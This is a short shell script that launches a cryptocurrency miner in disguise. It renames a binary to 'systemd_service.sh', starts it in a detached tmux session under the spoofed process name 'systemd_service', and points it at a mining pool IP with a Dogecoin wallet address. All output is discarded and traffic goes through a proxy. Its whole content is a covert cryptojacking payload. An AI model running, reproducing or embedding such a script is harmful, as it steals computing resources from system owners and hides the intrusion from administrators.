chmod +x ./localruntime
mv ./localruntime ./systemd_service.sh
tmux new -d -s sys-session "exec -a systemd_service ./systemd_service.sh --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=DOCKOTO --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 &> /dev/null"
